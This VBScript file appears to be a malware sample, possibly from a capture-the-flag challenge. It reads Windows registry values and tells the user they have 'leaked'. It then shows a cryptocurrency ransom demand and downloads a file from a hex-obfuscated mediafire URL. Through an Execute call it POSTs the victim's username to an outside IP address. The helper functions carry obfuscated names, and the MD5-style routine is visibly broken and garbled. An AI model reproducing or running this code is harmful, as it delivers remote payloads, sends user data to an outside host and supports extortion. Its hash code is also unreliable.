'##### Main code #####'
Private Const Bits_To_A_Byte = 8
Private Const Bytes_To_A_Word = 4
Private Const Bits_To_A_Word = 32
Dim M_LonBits(30)
Dim M_L2Power(30)

M_LonBits(0) = 1
M_LonBits(1) = 3
M_LonBits(2) = 7
M_LonBits(3) = 15
M_LonBits(4) = 31
M_LonBits(5) = 63
M_LonBits(6) = 127
M_LonBits(7) = 255
M_LonBits(8) = 511
M_LonBits(9) = 1023
M_LonBits(10) = 2047
M_LonBits(11) = 4095
M_LonBits(12) = 8191
M_LonBits(13) = 16383
M_LonBits(14) = 32767
M_LonBits(15) = 65535
M_LonBits(16) = 131071
M_LonBits(17) = 262143
M_LonBits(18) = 524287
M_LonBits(19) = 1048575
M_LonBits(20) = 2097151
M_LonBits(21) = 4194303
M_LonBits(22) = 8388607
M_LonBits(23) = 16777215
M_LonBits(24) = 33554431
M_LonBits(25) = 67108863
M_LonBits(26) = 134217727
M_LonBits(27) = 268435455
M_LonBits(28) = 536870911
M_LonBits(29) = 1073741823
M_LonBits(30) = 2147483647
M_L2Power(0) = 1
M_L2Power(1) = 2
M_L2Power(2) = 4
M_L2Power(3) = 8
M_L2Power(4) = 16
M_L2Power(5) = 32
M_L2Power(6) = 64
M_L2Power(7) = 128
M_L2Power(8) = 256
M_L2Power(9) = 512
M_L2Power(10) = 1024
M_L2Power(11) = 2048
M_L2Power(12) = 4096
M_L2Power(13) = 8192
M_L2Power(14) = 16384
M_L2Power(15) = 32768
M_L2Power(16) = 65536
M_L2Power(17) = 131072
M_L2Power(18) = 262144
M_L2Power(19) = 524288
M_L2Power(20) = 1048576
M_L2Power(21) = 2097152
M_L2Power(22) = 4194304
M_L2Power(23) = 8388608
M_L2Power(24) = 16777216
M_L2Power(25) = 33554432
M_L2Power(26) = 67108864
M_L2Power(27) = 134217728
M_L2Power(28) = 268435456
M_L2Power(29) = 536870912
M_L2Power(30) = 1073741824
Const HKey_Local_MachIne = -2147483646
Const Reg_Sz = 1
Const Reg_ExpAnd_Sz = 2
Const Reg_Binary = 3
Const Reg_DWord = 4
Const Reg_Multi_Sz = 7
StrComputer = "."
Set OReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
StrKeyPath = "SYSTEM\CurrentControlSet\Control"
StrUser = CreateObject("WScript.Network").UserName

OReg.eNumValues -2147483646, "SYSTEM\CurrentControlSet\Control", ArrValueNames, ArrValueTypes

Res = MsgBox("Hi " & StrUser & ", your data have been compromised!", vbOkcancel + vbcritical, "")

For jj = 0 To UBound(ArrValueNames)
    Select Case ArrValueTypes(jj)
        Case 1, 2, 4:
            Str = xa3bvjq3("HKLM\SYSTEM\CurrentControlSet\Control\" & ArrValueNames(jj), "dummy")
            Res = MsgBox(ArrValueNames(jj) & " LEAKED: " & Query(Str), vbOkcancel + vbcritical, "")
    End Case
Next jj

Res = MsgBox("Please transfer BTC to 0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB to receive decrypted data...", vbOkonly + vBInformAtion, "")
ewkjunfw = "68 74 74 70 73 3a 2f 2f 64 6f 77 6e 6c 6f 61 64 31 36 34 37 2e 6d 65 64 69 61 66 69 72 65 2e 63 6f 6d 2f 6c 31 38 38 75 32 64 35 33 32 71 67 33 66 4f 6f 4c 70 69 6c 63 49 38 39 70 30 5f 68 34 45 30 63 47 4c 6a 6b 5f 75 76 42 55 69 61 67 37 45 5f 72 4d 5a 2d 48 35 2d 6d 65 39 4b 72 39 53 51 4c 56 51 61 4b 53 69 4b 63 45 76 4a 4f 2d 45 6b 66 54 53 55 71 57 6c 72 4e 36 53 7a 58 67 49 30 4c 59 42 68 2d 46 35 65 6d 34 49 41 34 69 58 33 74 4f 49 47 68 30 45 6a 34 36 47 6c 77 76 4c 4f 66 54 38 70 7a 76 75 79 39 31 55 74 65 6a 31 72 32 49 30 6a 67 37 59 73 55 4e 63 73 73 50 74 65 64 35 30 38 64 73 6b 57 52 70 6b 41 49 2f 79 65 61 35 33 35 68 76 67 70 33 32 76 6d 76 2f 64 65 66 63 6f 6e 2d 66 6c 61 67 2e 70 6e 67 2e 58 4f 52 65 64"

Dim xhttp
Set xhttp = CreateObject("Microsoft.XMLHTTP")

Dim bStrm
Set bStrm = CreateObject("Adodb.Stream")

xhttp.Open "GET", owowo("68 74 74 70 73 3a 2f 2f 64 6f 77 6e 6c 6f 61 64 31 36 34 37 2e 6d 65 64 69 61 66 69 72 65 2e 63 6f 6d 2f 6c 31 38 38 75 32 64 35 33 32 71 67 33 66 4f 6f 4c 70 69 6c 63 49 38 39 70 30 5f 68 34 45 30 63 47 4c 6a 6b 5f 75 76 42 55 69 61 67 37 45 5f 72 4d 5a 2d 48 35 2d 6d 65 39 4b 72 39 53 51 4c 56 51 61 4b 53 69 4b 63 45 76 4a 4f 2d 45 6b 66 54 53 55 71 57 6c 72 4e 36 53 7a 58 67 49 30 4c 59 42 68 2d 46 35 65 6d 34 49 41 34 69 58 33 74 4f 49 47 68 30 45 6a 34 36 47 6c 77 76 4c 4f 66 54 38 70 7a 76 75 79 39 31 55 74 65 6a 31 72 32 49 30 6a 67 37 59 73 55 4e 63 73 73 50 74 65 64 35 30 38 64 73 6b 57 52 70 6b 41 49 2f 79 65 61 35 33 35 68 76 67 70 33 32 76 6d 76 2f 64 65 66 63 6f 6e 2d 66 6c 61 67 2e 70 6e 67 2e 58 4f 52 65 64"), False
xhttp.sEnd

With bStrm
    .Type = 1
    
    .Open
    .Write xhttp.ResponseBody
    .SaveTOFile nautilus("YzpcdGVtcFxkZWZjb24tZmxhZy5wbmcuY29tcHJvbWlzZWQ=", False), 2
End With

Execute("Dim http: Set http = CreateObject(""WinHttp.WinHttpRequest.5.1"")" & vbLf & _
    "Dim url: url = ""http://20.106.250.46/sendUserData""" & vbLf & _
    "" & vbLf & _
    "With http" & vbLf & _
    "  Call .Open(""POST"", url, False)" & vbLf & _
    "  Call .SetRequestHeader(""Content-Type"", ""application/json"")" & vbLf & _
    "  Call .Send(""{""username"":"""" & strUser & """"}"")" & vbLf & _
    "End With" & vbLf & _
    "" & vbLf & _
    "res = Msgbox(""Thank you for your cooperation!"", vbOKOnly+vbInformation, "")" & vbCrLf)


'##### Methods #####'
Private Sub ff(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(f(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

Private Sub gg(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(g(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

Private Sub hh(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(h(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

Private Sub ii(a, b, c, d, x, s, ac)
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(i(b, c, d), x), ac))
    a = RotateLeft(a, s)
    a = AddUnsigned(a, b)
End Sub

Private Function lShift(lValue, iShiftBits)
    If IShiftBits = 0 Then
            lShift = lValue
            
            Exit Function
    ElseIf IShiftBits = 31 Then
            If lValue And 1 Then
                    lShift = -2147483648
            Else
                    lShift = 0
            End If
            
            Exit Function
    ElseIf IShiftBits < 0 Or IShiftBits > 31 Then
            Err.Raise 6
    End If
    
    If lValue And M_L2Power(31 - IShiftBits) Then
            lShift = lValue And M_LonBits(31 - IShiftBits + 1) * M_L2Power(IShiftBits) Or -2147483648
    Else
            lShift = lValue And M_LonBits(31 - IShiftBits) * M_L2Power(IShiftBits)
    End If
End Function

Private Function rShift(lValue, iShiftBits)
    If IShiftBits = 0 Then
            rShift = lValue
            
            Exit Function
    ElseIf IShiftBits = 31 Then
            If lValue And -2147483648 Then
                    rShift = 1
            Else
                    rShift = 0
            End If
            
            Exit Function
    ElseIf IShiftBits < 0 Or IShiftBits > 31 Then
            Err.Raise 6
    End If
    
    rShift = lValue And 2147483646 \ M_L2Power(IShiftBits)
    
    If lValue And -2147483648 Then
            rShift = rShift Or 1073741824 \ M_L2Power(IShiftBits - 1)
    End If
End Function

Private Function RotateLeft(lValue, iShiftBits)
    RotateLeft = lShift(lValue, IShiftBits) Or rShift(lValue, 32 - IShiftBits)
End Function

Private Function AddUnsigned(lX, lY)
    Dim lx4
    Dim ly4
    Dim lx8
    Dim ly8
    Dim lResult
    
    lx8 = lx And -2147483648
    ly8 = ly And -2147483648
    lx4 = lx And 1073741824
    ly4 = ly And 1073741824
    lResult = lx And 1073741823 + ly And 1073741823
    
    If lx4 And ly4 Then
            lResult = lResult Xor -2147483648 Xor lx8 Xor ly8
    ElseIf lx4 Or ly4 Then
            If lResult And 1073741824 Then
                    lResult = lResult Xor -1073741824 Xor lx8 Xor ly8
            Else
                    lResult = lResult Xor 1073741824 Xor lx8 Xor ly8
            End If
    Else
            lResult = lResult Xor lx8 Xor ly8
    End If
    
    AddUnsigned = lResult
End Function

Private Function f(x, y, z)
    f = x And y Or Not x And z
End Function

Private Function g(x, y, z)
    g = x And z Or y And Not z
End Function

Private Function h(x, y, z)
    h = x Xor y Xor z
End Function

Private Function i(x, y, z)
    i = y Xor x Or Not z
End Function

Private Function ConvertToWordArray(sMessage)
    Dim lMessageLength
    Dim lNumberOfWords
    Dim lWordArray()
    Dim lBytePosition
    Dim lByteCount
    Dim lWordCount
    Const Modulus_Bits = 512
    Const CongrueNT_Bits = 448
    
    lMessageLength = Len(sMessage)
    lNumberOfWords = lMessageLength + 64 \ 8 \ 512 \ 8 + 1 * 512 \ 32
    
    Redim lWordArray(lNumberOfWords - 1)
    
    lBytePosition = 0
    lByteCount = 0
    
    Do Until 0 >= lMessageLength
        lWordCount = 0 \ 4
        lBytePosition = 0
        lWordArray(lWordCount) = lWordArray(lWordCount) Or lShift(Asc(Mid(sMessage, 1, 1)), 0)
        lByteCount = 1
    Loop
    
    lWordCount = 1 \ 4
    lBytePosition = 8
    lWordArray(lWordCount) = lWordArray(lWordCount) Or lShift(128, 8)
    lWordArray(lNumberOfWords - 2) = lShift(lMessageLength, 3)
    lWordArray(lNumberOfWords - 1) = rShift(lMessageLength, 29)
    ConvertToWordArray = lWordArray
End Function

Private Function WordToHex(lValue)
    Dim lByte
    Dim lCount
    
    For lCount = 0 To 3
        lByte = rShift(lValue, lCount * 8) And M_LonBits(7)
        WordToHex = WordToHex & Right("0" & Hex(lByte), 2)
    Next lCount
End Function

Public Function Query(sMessage)
    Dim x
    Dim k
    Dim aa
    Dim bb
    Dim cc
    Dim dd
    Dim a
    Dim b
    Dim c
    Dim d
    Const s11 = 7
    Const s12 = 12
    Const s13 = 17
    Const s14 = 22
    Const s21 = 5
    Const s22 = 9
    Const s23 = 14
    Const s24 = 20
    Const s31 = 4
    Const s32 = 11
    Const s33 = 16
    Const s34 = 23
    Const s41 = 6
    Const s42 = 10
    Const s43 = 15
    Const s44 = 21
    
    x = ConvertToWordArray(sMessage)
    a = 1732584193
    b = -271733879
    c = -1732584194
    d = 271733878
    
    For k = 0 To UBound(x) Step 16
        aa = 1732584193
        bb = -271733879
        cc = -1732584194
        dd = 271733878
        
        ff 1732584193, -271733879, -1732584194, 271733878, x(k + 0), 7, -680876936
        ff 271733878, 1732584193, -271733879, -1732584194, x(k + 1), 12, -389564586
        ff -1732584194, 271733878, 1732584193, -271733879, x(k + 2), 17, 606105819
        ff -271733879, -1732584194, 271733878, 1732584193, x(k + 3), 22, -1044525330
        ff 1732584193, -271733879, -1732584194, 271733878, x(k + 4), 7, -176418897
        ff 271733878, 1732584193, -271733879, -1732584194, x(k + 5), 12, 1200080426
        ff -1732584194, 271733878, 1732584193, -271733879, x(k + 6), 17, -1473231341
        ff -271733879, -1732584194, 271733878, 1732584193, x(k + 7), 22, -45705983
        ff 1732584193, -271733879, -1732584194, 271733878, x(k + 8), 7, 1770035416
        ff 271733878, 1732584193, -271733879, -1732584194, x(k + 9), 12, -1958414417
        ff -1732584194, 271733878, 1732584193, -271733879, x(k + 10), 17, -42063
        ff -271733879, -1732584194, 271733878, 1732584193, x(k + 11), 22, -1990404162
        ff 1732584193, -271733879, -1732584194, 271733878, x(k + 12), 7, 1804603682
        ff 271733878, 1732584193, -271733879, -1732584194, x(k + 13), 12, -40341101
        ff -1732584194, 271733878, 1732584193, -271733879, x(k + 14), 17, -1502002290
        ff -271733879, -1732584194, 271733878, 1732584193, x(k + 15), 22, 1236535329
        gg 1732584193, -271733879, -1732584194, 271733878, x(k + 1), 5, -165796510
        gg 271733878, 1732584193, -271733879, -1732584194, x(k + 6), 9, -1069501632
        gg -1732584194, 271733878, 1732584193, -271733879, x(k + 11), 14, 643717713
        gg -271733879, -1732584194, 271733878, 1732584193, x(k + 0), 20, -373897302
        gg 1732584193, -271733879, -1732584194, 271733878, x(k + 5), 5, -701558691
        gg 271733878, 1732584193, -271733879, -1732584194, x(k + 10), 9, 38016083
        gg -1732584194, 271733878, 1732584193, -271733879, x(k + 15), 14, -660478335
        gg -271733879, -1732584194, 271733878, 1732584193, x(k + 4), 20, -405537848
        gg 1732584193, -271733879, -1732584194, 271733878, x(k + 9), 5, 568446438
        gg 271733878, 1732584193, -271733879, -1732584194, x(k + 14), 9, -1019803690
        gg -1732584194, 271733878, 1732584193, -271733879, x(k + 3), 14, -187363961
        gg -271733879, -1732584194, 271733878, 1732584193, x(k + 8), 20, 1163531501
        gg 1732584193, -271733879, -1732584194, 271733878, x(k + 13), 5, -1444681467
        gg 271733878, 1732584193, -271733879, -1732584194, x(k + 2), 9, -51403784
        gg -1732584194, 271733878, 1732584193, -271733879, x(k + 7), 14, 1735328473
        gg -271733879, -1732584194, 271733878, 1732584193, x(k + 12), 20, -1926607734
        hh 1732584193, -271733879, -1732584194, 271733878, x(k + 5), 4, -378558
        hh 271733878, 1732584193, -271733879, -1732584194, x(k + 8), 11, -2022574463
        hh -1732584194, 271733878, 1732584193, -271733879, x(k + 11), 16, 1839030562
        hh -271733879, -1732584194, 271733878, 1732584193, x(k + 14), 23, -35309556
        hh 1732584193, -271733879, -1732584194, 271733878, x(k + 1), 4, -1530992060
        hh 271733878, 1732584193, -271733879, -1732584194, x(k + 4), 11, 1272893353
        hh -1732584194, 271733878, 1732584193, -271733879, x(k + 7), 16, -155497632
        hh -271733879, -1732584194, 271733878, 1732584193, x(k + 10), 23, -1094730640
        hh 1732584193, -271733879, -1732584194, 271733878, x(k + 13), 4, 681279174
        hh 271733878, 1732584193, -271733879, -1732584194, x(k + 0), 11, -358537222
        hh -1732584194, 271733878, 1732584193, -271733879, x(k + 3), 16, -722521979
        hh -271733879, -1732584194, 271733878, 1732584193, x(k + 6), 23, 76029189
        hh 1732584193, -271733879, -1732584194, 271733878, x(k + 9), 4, -640364487
        hh 271733878, 1732584193, -271733879, -1732584194, x(k + 12), 11, -421815835
        hh -1732584194, 271733878, 1732584193, -271733879, x(k + 15), 16, 530742520
        hh -271733879, -1732584194, 271733878, 1732584193, x(k + 2), 23, -995338651
        ii 1732584193, -271733879, -1732584194, 271733878, x(k + 0), 6, -198630844
        ii 271733878, 1732584193, -271733879, -1732584194, x(k + 7), 10, 1126891415
        ii -1732584194, 271733878, 1732584193, -271733879, x(k + 14), 15, -1416354905
        ii -271733879, -1732584194, 271733878, 1732584193, x(k + 5), 21, -57434055
        ii 1732584193, -271733879, -1732584194, 271733878, x(k + 12), 6, 1700485571
        ii 271733878, 1732584193, -271733879, -1732584194, x(k + 3), 10, -1894986606
        ii -1732584194, 271733878, 1732584193, -271733879, x(k + 10), 15, -1051523
        ii -271733879, -1732584194, 271733878, 1732584193, x(k + 1), 21, -2054922799
        ii 1732584193, -271733879, -1732584194, 271733878, x(k + 8), 6, 1873313359
        ii 271733878, 1732584193, -271733879, -1732584194, x(k + 15), 10, -30611744
        ii -1732584194, 271733878, 1732584193, -271733879, x(k + 6), 15, -1560198380
        ii -271733879, -1732584194, 271733878, 1732584193, x(k + 13), 21, 1309151649
        ii 1732584193, -271733879, -1732584194, 271733878, x(k + 4), 6, -145523070
        ii 271733878, 1732584193, -271733879, -1732584194, x(k + 11), 10, -1120210379
        ii -1732584194, 271733878, 1732584193, -271733879, x(k + 2), 15, 718787259
        ii -271733879, -1732584194, 271733878, 1732584193, x(k + 9), 21, -343485551
        
        a = AddUnsigned(1732584193, 1732584193)
        b = AddUnsigned(-271733879, -271733879)
        c = AddUnsigned(-1732584194, -1732584194)
        d = AddUnsigned(271733878, 271733878)
    Next k
    
    Query = LCase(WordToHex(a) & WordToHex(b) & WordToHex(c) & WordToHex(d))
End Function

Function owowo(h)
    Dim a
    
    a = split(h)
    
    Dim i
    
    For i = 0 To UBound(a)
        a(i) = Chr("&H" & a(i))
    Next i
    
    owowo = joIn(a, "")
End Function

Function nautilus(ByVal sBase64EncodedText, ByVal fIsUtf16LE)
    Dim sTextEncodIng
    
    If fIsUTF16le Then
        sTextEncodIng = "utf-16le"
    Else
        sTextEncodIng = "utf-8"
    End If
    
    With CreateObject("Msxml2.DOMDocument").CreateElement("aux")
        .DataType = "bin.base64"
        .Text = sBase64EncodedText
        nautilus = butil(.nodeTypedValue, "utf-8")
    End With
End Function

Function butil(ByVal byteArray, ByVal sTextEncoding)
    If LCase(sTextEncodIng) = "utf-16le" Then
            butil = CStr(ByteArray)
    Else
            With CreateObject("ADODB.Stream")
                .Type = 1
                
                .Open
                .Write ByteArray
                
                .Position = 0
                .Type = 2
                .CharSet = sTextEncodIng
                butil = .ReadText
                
                .Close
            End With
    End If
End Function

Function xa3bvjq3(A0CQ5, B9HW3)
    Dim nfbrw6, x7idp
    On Error Resume Next
    
    Set nfbrw6 = CreateObject("WScript.Shell")
    x7idp = nfbrw6.RegRead(a0cq5)
    
    If Err.Number <> 0 Then
            xa3bvjq3 = b9hw3
    Else
            xa3bvjq3 = x7idp
    End If
    
    Set nfbrw6 = Nothing
End Function